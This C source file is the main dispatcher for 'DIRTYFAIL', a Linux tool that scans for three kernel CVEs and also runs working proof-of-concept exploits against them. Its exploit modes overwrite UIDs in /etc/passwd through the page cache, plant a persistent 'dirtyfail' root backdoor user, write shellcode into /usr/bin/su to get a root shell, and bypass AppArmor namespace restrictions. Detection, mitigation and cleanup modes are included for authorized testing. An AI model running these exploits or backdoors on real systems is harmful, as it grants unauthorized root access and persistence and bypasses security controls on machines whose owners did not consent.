/*
 * DIRTYFAIL — main entry point
 *
 * A single binary that detects and (with explicit consent) demonstrates
 * exploitation of:
 *
 *   - Copy Fail            CVE-2026-31431
 *   - Dirty Frag (xfrm-ESP) CVE-2026-43284
 *   - Dirty Frag (RxRPC)    CVE-2026-43500
 *
 * Default mode is detection. The exploit modes never run without
 * --exploit on the command line *and* a typed-string confirmation at
 * runtime.
 *
 * Exit codes:
 *   0  not vulnerable (or: exploit succeeded — semantically "you can
 *      now type `exit` and the test ran")
 *   1  test error / could not determine
 *   2  vulnerable
 *   3  exploit attempted but did not land
 *   4  preconditions not met (effectively "not vulnerable here")
 *   5  exploit succeeded and a root shell was spawned
 */

#include "common.h"
#include "copyfail.h"
#include "copyfail_gcm.h"
#include "dirtyfrag_esp.h"
#include "dirtyfrag_esp6.h"
#include "dirtyfrag_rxrpc.h"
#include "apparmor_bypass.h"
#include "backdoor.h"
#include "mitigate.h"
#include "exploit_su.h"

#include <getopt.h>
#include <fcntl.h>
#include <sys/utsname.h>

static const char BANNER[] =
"\n"
" ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗      \n"
" ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║      \n"
" ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║      \n"
" ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║      \n"
" ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗ \n"
" ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝ \n"
"            Copy Fail + Dirty Frag detector & PoC\n"
"            CVE-2026-31431 / 43284 / 43500\n";

static void usage(const char *prog)
{
    fprintf(stderr,
"Usage: %s [MODE] [OPTIONS]\n"
"\n"
"Modes (pick one; default is --scan):\n"
"  --scan                 detect all three CVEs (no system modification)\n"
"  --check-copyfail       Copy Fail (CVE-2026-31431) detection only\n"
"  --check-esp            Dirty Frag xfrm-ESP (CVE-2026-43284) detection only\n"
"  --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only\n"
"  --check-esp6           IPv6 xfrm-ESP path (CVE-2026-43284 v6) detection\n"
"  --check-gcm            Copy Fail GCM variant detection\n"
"  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead\n"
"  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP (v4)\n"
"  --exploit-esp6         real PoC: flip /etc/passwd UID via xfrm-ESP (v6)\n"
"  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad\n"
"                         (fcrypt brute-force + AF_RXRPC handshake forgery)\n"
"  --exploit-gcm          real PoC: flip /etc/passwd UID via rfc4106(gcm(aes))\n"
"                         single-byte primitive (works when authencesn is\n"
"                         blacklisted but rfc4106 isn't)\n"
"  --exploit-backdoor     PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash\n"
"                         into /etc/passwd page cache; survives shell exit\n"
"                         until page eviction. Use --cleanup-backdoor to revert.\n"
"  --exploit-su           V4bel-style: plant arch-specific shellcode at\n"
"                         /usr/bin/su entry point in page cache; running\n"
"                         su then yields a /bin/sh root shell. No PAM\n"
"                         dependency. x86_64 tested; aarch64 ships but is\n"
"                         hardware-untested (gated behind an env var).\n"
"                         Saves original entry-point bytes to\n"
"                         /var/tmp/.dirtyfail-su.state for revert via\n"
"                         --cleanup-su.\n"
"  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
"  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state\n"
"  --cleanup-su           restore /usr/bin/su entry-point bytes from state file\n"
"  --list-state           report what (if anything) is currently planted —\n"
"                         reads /var/tmp/.dirtyfail*.state files and\n"
"                         describes each. Side-effect free.\n"
"  --mitigate             DEFENSIVE: blacklist algif_aead/esp4/esp6/rxrpc,\n"
"                         set apparmor_restrict_unprivileged_userns=1.\n"
"                         Requires root. Side-effect: breaks IPsec/AFS.\n"
"  --cleanup-mitigate     remove the modprobe/sysctl mitigation files\n"
"  --version              print version\n"
"  --help                 this message\n"
"\n"
"Options:\n"
"  --active               in --scan / --check-* mode, do an active sentinel\n"
"                         STORE probe per CVE in addition to precondition\n"
"                         checks. Modifies /tmp sentinels only; never\n"
"                         touches /etc/passwd. Requires AA bypass on\n"
"                         hardened distros, so may take ~5-10s.\n"
"  --no-shell             after a successful exploit, do NOT execve `su`;\n"
"                         instead revert the page-cache patch and exit\n"
"  --no-revert            with --no-shell, also skip the auto-revert\n"
"                         (leaves the page cache poisoned — used by\n"
"                         tools/dirtyfail-container-escape.sh demo)\n"
"  --json                 emit a single JSON object on stdout (--scan\n"
"                         only); all log output redirected to stderr.\n"
"                         Suitable for SIEM/fleet scanning. Implies\n"
"                         --no-color and suppresses the banner.\n"
"  --no-color             disable ANSI color in output\n"
"  --aa-bypass            force the AppArmor unprivileged-userns bypass\n"
"                         (auto-armed when restricted profile is detected)\n"
"\n"
"Exit codes:\n"
"  0 not vulnerable / clean    2 vulnerable     5 exploit succeeded\n"
"  1 test error                3 exploit failed 4 preconditions missing\n"
"\n"
"AUTHORIZED TESTING ONLY. Run only on systems you own or are explicitly\n"
"engaged to assess. The --exploit modes corrupt /etc/passwd in the\n"
"kernel page cache; cleanup with --cleanup or `echo 3 > /proc/sys/vm/drop_caches`.\n",
    prog);
}

enum mode {
    MODE_SCAN,
    MODE_CHECK_COPYFAIL,
    MODE_CHECK_ESP,
    MODE_CHECK_ESP6,
    MODE_CHECK_RXRPC,
    MODE_CHECK_GCM,
    MODE_EXPLOIT_COPYFAIL,
    MODE_EXPLOIT_ESP,
    MODE_EXPLOIT_ESP6,
    MODE_EXPLOIT_RXRPC,
    MODE_EXPLOIT_GCM,
    MODE_EXPLOIT_BACKDOOR,
    MODE_EXPLOIT_SU,
    MODE_CLEANUP,
    MODE_CLEANUP_BACKDOOR,
    MODE_CLEANUP_SU,
    MODE_MITIGATE,
    MODE_CLEANUP_MITIGATE,
    MODE_LIST_STATE,
    MODE_HELP,
    MODE_VERSION,
};

#define DIRTYFAIL_VERSION "0.1.0"

int main(int argc, char **argv)
{
    /* Pick up flags that need to survive AA-bypass fork+re-exec via env.
     * The child re-execs with its own argv (stage tags only), so flags
     * set in the parent's argv don't reach the child unless we propagate
     * them through env vars. --json is the main case: without this, the
     * child's log_* output goes to stdout and corrupts the JSON document
     * the parent is building. */
    if (getenv("DIRTYFAIL_JSON")) {
        dirtyfail_json     = true;
        dirtyfail_use_color = false;
    }

    /* If we're a re-exec from the apparmor bypass dance, route to the
     * stage handler immediately. Stage 1 re-execs to stage 2; stage 2
     * unshares + raises caps, then either:
     *   (a) DIRTYFAIL_INNER_MODE is set → we're a fork-based exploit
     *       child. Dispatch to the inner handler and exit. Parent
     *       (init ns) reaps us and continues with verify + su.
     *   (b) Not set → legacy `--aa-bypass` whole-process mode; fall
     *       through to the normal main() flow with rewritten argv. */
    if (apparmor_bypass_is_stage(argc, argv)) {
        int new_argc = argc;
        char **new_argv = argv;
        if (apparmor_bypass_run_stage(argc, argv, &new_argc, &new_argv) != 0) {
            fprintf(stderr, "apparmor bypass stage failed\n");
            return 1;
        }
        const char *inner = getenv("DIRTYFAIL_INNER_MODE");
        if (inner && *inner) {
            df_result_t r = DF_TEST_ERROR;
            if      (strcmp(inner, "esp")              == 0) r = dirtyfrag_esp_exploit_inner();
            else if (strcmp(inner, "esp6")             == 0) r = dirtyfrag_esp6_exploit_inner();
            else if (strcmp(inner, "rxrpc")            == 0) r = dirtyfrag_rxrpc_exploit_inner();
            else if (strcmp(inner, "gcm")              == 0) r = copyfail_gcm_exploit_inner();
            else if (strcmp(inner, "esp-probe")        == 0) r = dirtyfrag_esp_active_probe_inner();
            else if (strcmp(inner, "esp6-probe")       == 0) r = dirtyfrag_esp6_active_probe_inner();
            else if (strcmp(inner, "rxrpc-probe")      == 0) r = dirtyfrag_rxrpc_active_probe_inner();
            else if (strcmp(inner, "gcm-probe")        == 0) r = copyfail_gcm_active_probe_inner();
            else if (strcmp(inner, "backdoor-install") == 0) r = backdoor_install_inner();
            else if (strcmp(inner, "backdoor-cleanup") == 0) r = backdoor_cleanup_inner();
            else {
                fprintf(stderr, "unknown DIRTYFAIL_INNER_MODE: %s\n", inner);
                r = DF_TEST_ERROR;
            }
            return (int)r;
        }
        argc = new_argc;
        argv = new_argv;
    }

    enum mode m        = MODE_SCAN;
    bool      do_shell = true;
    bool      aa_bypass = false;

    static const struct option opts[] = {
        {"scan",             no_argument, NULL, 'S'},
        {"check-copyfail",   no_argument, NULL,  1 },
        {"check-esp",        no_argument, NULL,  2 },
        {"check-rxrpc",       no_argument, NULL,  3 },
        {"check-esp6",        no_argument, NULL,  9 },
        {"check-gcm",         no_argument, NULL, 10 },
        {"exploit-copyfail",  no_argument, NULL,  4 },
        {"exploit-esp",       no_argument, NULL,  5 },
        {"exploit-esp6",      no_argument, NULL, 11 },
        {"exploit-rxrpc",     no_argument, NULL,  7 },
        {"exploit-gcm",       no_argument, NULL, 12 },
        {"exploit-backdoor",  no_argument, NULL, 13 },
        {"cleanup",           no_argument, NULL,  6 },
        {"cleanup-backdoor",  no_argument, NULL, 14 },
        {"mitigate",          no_argument, NULL, 15 },
        {"cleanup-mitigate",  no_argument, NULL, 16 },
        {"active",            no_argument, NULL, 17 },
        {"exploit-su",        no_argument, NULL, 18 },
        {"cleanup-su",        no_argument, NULL, 19 },
        {"no-revert",         no_argument, NULL, 20 },
        {"json",              no_argument, NULL, 21 },
        {"list-state",        no_argument, NULL, 22 },
        {"no-shell",         no_argument, NULL, 'n'},
        {"no-color",         no_argument, NULL, 'C'},
        {"aa-bypass",        no_argument, NULL,  8 },
        {"help",             no_argument, NULL, 'h'},
        {"version",          no_argument, NULL, 'V'},
        {0,0,0,0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "ShVnC", opts, NULL)) != -1) {
        switch (c) {
            case 'S':  m = MODE_SCAN;             break;
            case  1 :  m = MODE_CHECK_COPYFAIL;   break;
            case  2 :  m = MODE_CHECK_ESP;        break;
            case  3 :  m = MODE_CHECK_RXRPC;      break;
            case  4 :  m = MODE_EXPLOIT_COPYFAIL; break;
            case  5 :  m = MODE_EXPLOIT_ESP;      break;
            case  7 :  m = MODE_EXPLOIT_RXRPC;    break;
            case  6 :  m = MODE_CLEANUP;          break;
            case  9 :  m = MODE_CHECK_ESP6;       break;
            case 10 :  m = MODE_CHECK_GCM;        break;
            case 11 :  m = MODE_EXPLOIT_ESP6;     break;
            case 12 :  m = MODE_EXPLOIT_GCM;      break;
            case 13 :  m = MODE_EXPLOIT_BACKDOOR; break;
            case 14 :  m = MODE_CLEANUP_BACKDOOR; break;
            case 15 :  m = MODE_MITIGATE;         break;
            case 16 :  m = MODE_CLEANUP_MITIGATE; break;
            case 17 :  dirtyfail_active_probes = true; break;
            case 18 :  m = MODE_EXPLOIT_SU;       break;
            case 19 :  m = MODE_CLEANUP_SU;       break;
            case 20 :  dirtyfail_no_revert = true; break;
            case 21 :  dirtyfail_json = true;
                       dirtyfail_use_color = false;
                       /* Propagate through fork+re-exec for AA bypass children */
                       setenv("DIRTYFAIL_JSON", "1", 1);
                       break;
            case 22 :  m = MODE_LIST_STATE;       break;
            case 'n':  do_shell = false;          break;
            case 'C':  dirtyfail_use_color = false; break;
            case  8 :  aa_bypass = true;          break;
            case 'h':  m = MODE_HELP;             break;
            case 'V':  m = MODE_VERSION;          break;
            default :  usage(argv[0]);            return 1;
        }
    }

    if (m == MODE_HELP)    { usage(argv[0]); return 0; }
    if (m == MODE_VERSION) { puts("DIRTYFAIL " DIRTYFAIL_VERSION); return 0; }

    /* Exploit modes now do their OWN fork-based AA bypass internally
     * (parent stays in init ns for the post-exploit `su` to drop into
     * REAL init-ns root). We only arm the legacy whole-process bypass
     * when the operator explicitly requests it via --aa-bypass — that
     * path is mostly useful for debugging the bypass mechanics in
     * isolation, not for actual exploitation. */
    if (aa_bypass) {
        log_warn("--aa-bypass: arming legacy whole-process bypass");
        log_hint("note: exploit modes now do their own fork-based bypass; "
                 "this flag is for debugging only and may break su afterwards.");
        if (apparmor_bypass_arm_and_relaunch(argc, argv) != 0) {
            log_warn("apparmor bypass failed (%s) — continuing un-bypassed",
                     strerror(errno));
        }
    }

    if (!dirtyfail_json) {
        if (dirtyfail_use_color) fputs("\033[1;35m", stdout);
        fputs(BANNER, stdout);
        if (dirtyfail_use_color) fputs("\033[0m", stdout);
        fputc('\n', stdout);
    }

    df_result_t r = DF_OK;

    switch (m) {
    case MODE_SCAN: {
        log_step("running full scan — five detectors\n");

        df_result_t a  = copyfail_detect();         if (!dirtyfail_json) fputc('\n', stdout);
        df_result_t b  = dirtyfrag_esp_detect();    if (!dirtyfail_json) fputc('\n', stdout);
        df_result_t b6 = dirtyfrag_esp6_detect();   if (!dirtyfail_json) fputc('\n', stdout);
        df_result_t c2 = dirtyfrag_rxrpc_detect();  if (!dirtyfail_json) fputc('\n', stdout);
        df_result_t g  = copyfail_gcm_detect();     if (!dirtyfail_json) fputc('\n', stdout);

        const char *label[] = {
            [DF_OK]            = "not vulnerable",
            [DF_TEST_ERROR]    = "test error",
            [DF_VULNERABLE]    = "VULNERABLE",
            [DF_PRECOND_FAIL]  = "preconditions missing",
        };
        const char *json_label[] = {
            [DF_OK]            = "not_vulnerable",
            [DF_TEST_ERROR]    = "test_error",
            [DF_VULNERABLE]    = "vulnerable",
            [DF_PRECOND_FAIL]  = "preconds_missing",
        };

        if (!dirtyfail_json) {
            log_step("scan summary:");
            log_hint("  Copy Fail (algif_aead, CVE-2026-31431):     %s", label[a  & 7]);
            log_hint("  Dirty Frag ESP v4 (CVE-2026-43284):         %s", label[b  & 7]);
            log_hint("  Dirty Frag ESP v6 (CVE-2026-43284 v6):      %s", label[b6 & 7]);
            log_hint("  Dirty Frag RxRPC  (CVE-2026-43500):         %s", label[c2 & 7]);
            log_hint("  Copy Fail GCM variant (xfrm rfc4106):       %s", label[g  & 7]);
        }

        if (a == DF_VULNERABLE || b == DF_VULNERABLE || b6 == DF_VULNERABLE ||
            c2 == DF_VULNERABLE || g == DF_VULNERABLE)
            r = DF_VULNERABLE;
        else if (a == DF_TEST_ERROR || b == DF_TEST_ERROR || b6 == DF_TEST_ERROR ||
                 c2 == DF_TEST_ERROR || g == DF_TEST_ERROR)
            r = DF_TEST_ERROR;
        else
            r = DF_OK;

        if (dirtyfail_json) {
            struct utsname u; uname(&u);
            const char *summary = json_label[r & 7];
            printf("{\n");
            printf("  \"tool\": \"dirtyfail\",\n");
            printf("  \"version\": \"" DIRTYFAIL_VERSION "\",\n");
            printf("  \"hostname\": \"%s\",\n", u.nodename);
            printf("  \"kernel\": \"%s\",\n",   u.release);
            printf("  \"machine\": \"%s\",\n",  u.machine);
            printf("  \"active_probes\": %s,\n",
                   dirtyfail_active_probes ? "true" : "false");
            printf("  \"results\": [\n");
            printf("    {\"cve\": \"CVE-2026-31431\",     \"name\": \"copyfail\",        \"status\": \"%s\"},\n", json_label[a  & 7]);
            printf("    {\"cve\": \"CVE-2026-43284\",     \"name\": \"dirtyfrag-esp\",   \"status\": \"%s\"},\n", json_label[b  & 7]);
            printf("    {\"cve\": \"CVE-2026-43284-v6\",  \"name\": \"dirtyfrag-esp6\",  \"status\": \"%s\"},\n", json_label[b6 & 7]);
            printf("    {\"cve\": \"CVE-2026-43500\",     \"name\": \"dirtyfrag-rxrpc\", \"status\": \"%s\"},\n", json_label[c2 & 7]);
            printf("    {\"cve\": \"CVE-2026-31431-gcm\", \"name\": \"copyfail-gcm\",    \"status\": \"%s\"}\n",  json_label[g  & 7]);
            printf("  ],\n");
            printf("  \"summary\": \"%s\"\n", summary);
            printf("}\n");
        }
        break;
    }

    case MODE_CHECK_COPYFAIL: r = copyfail_detect();        break;
    case MODE_CHECK_ESP:      r = dirtyfrag_esp_detect();   break;
    case MODE_CHECK_ESP6:     r = dirtyfrag_esp6_detect();  break;
    case MODE_CHECK_RXRPC:    r = dirtyfrag_rxrpc_detect(); break;
    case MODE_CHECK_GCM:      r = copyfail_gcm_detect();    break;

    case MODE_EXPLOIT_COPYFAIL:
        log_warn("running real PoC for Copy Fail (CVE-2026-31431)");
        r = copyfail_exploit(do_shell);
        break;

    case MODE_EXPLOIT_ESP:
        log_warn("running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)");
        r = dirtyfrag_esp_exploit(do_shell);
        break;

    case MODE_EXPLOIT_RXRPC:
        log_warn("running real PoC for Dirty Frag RxRPC (CVE-2026-43500)");
        r = dirtyfrag_rxrpc_exploit(do_shell);
        break;

    case MODE_EXPLOIT_ESP6:
        log_warn("running real PoC for Dirty Frag IPv6 xfrm-ESP");
        r = dirtyfrag_esp6_exploit(do_shell);
        break;

    case MODE_EXPLOIT_GCM:
        log_warn("running real PoC for Copy Fail GCM variant (rfc4106)");
        r = copyfail_gcm_exploit(do_shell);
        break;

    case MODE_EXPLOIT_BACKDOOR:
        log_warn("installing PERSISTENT backdoor user 'dirtyfail' (page-cache only)");
        r = backdoor_install(do_shell);
        break;

    case MODE_CLEANUP_BACKDOOR:
        r = backdoor_cleanup();
        break;

    case MODE_EXPLOIT_SU:
        log_warn("planting x86_64 shellcode at /usr/bin/su entry point (page cache)");
        r = exploit_su_shellcode(do_shell);
        break;

    case MODE_CLEANUP_SU:
        r = cleanup_su_shellcode();
        break;

    case MODE_MITIGATE:
        r = mitigate_apply();
        break;

    case MODE_CLEANUP_MITIGATE:
        r = mitigate_revert();
        break;

    case MODE_LIST_STATE: {
        log_step("--list-state: scanning /var/tmp for stashed dirtyfail state files");
        bool any = false;
        if (backdoor_list_state())    any = true;
        if (exploit_su_list_state())  any = true;
        if (!any) {
            log_ok("no dirtyfail state files present — system is clean");
        } else {
            log_hint("(state files only describe what was planted — they do");
            log_hint(" not by themselves prove the page cache is still poisoned;");
            log_hint(" run `--cleanup` / `--cleanup-backdoor` / `--cleanup-su`");
            log_hint(" to evict + restore.)");
        }
        r = DF_OK;
        break;
    }

    case MODE_CLEANUP:
        log_step("evicting /etc/passwd page cache");
        if (geteuid() != 0) {
            /* POSIX_FADV_DONTNEED on a read-only fd held by a non-root
             * user *silently no-ops* on Linux — fadvise returns 0 but
             * does not actually evict any pages. The only path that
             * works without write access is `drop_caches`, which
             * itself needs root. So warn the operator clearly. */
            log_warn("running as non-root: POSIX_FADV_DONTNEED will return 0 "
                     "but NOT evict any pages (kernel ignores it for readers "
                     "without write access). The page-cache STORE will persist "
                     "until eviction by memory pressure or reboot.");
            log_warn("re-run as 'sudo dirtyfail --cleanup' to drop_caches.");
        } else {
            int fd = open("/etc/passwd", O_RDONLY);
            if (fd >= 0) {
#ifdef POSIX_FADV_DONTNEED
                posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#endif
                close(fd);
            }
            log_step("dropping caches");
            if (drop_caches()) log_ok("drop_caches OK");
            else log_warn("drop_caches failed: %s", strerror(errno));
        }
        r = DF_OK;
        break;

    default:
        usage(argv[0]);
        return 1;
    }

    return (int)r;
}
